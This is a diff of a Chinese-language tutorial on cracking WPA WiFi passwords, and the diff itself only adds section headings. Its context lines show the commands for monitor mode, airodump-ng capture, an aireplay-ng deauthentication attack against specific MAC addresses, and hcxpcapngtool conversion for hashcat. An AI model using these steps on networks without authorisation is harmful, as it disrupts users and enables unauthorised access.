@@ -22,16 +22,21 @@ comments: false
 sudo airmon-ng start wlan0
 ```
 
+## 扫描可用WiFi
 airodump 扫描可用wifi
 ```
 sudo airodump-ng wlan0mon -c 1 -w WPA
 ```
 
+
+## 取消身份认证攻击
 执行取消身份验证攻击
 ```
 sudo aireplay-ng -0 5 -a 80:2D:BF:FE:13:83 -c 8A:00:A9:9B:ED:1A wlan0
 ```
 
+
+## 密码破解
 接下来，使用hashcat进行密码，破解。首先需要转换为hashcat可接受的格式
 ```
 hcxpcapngtool -o hash wpa-Induction.pcap
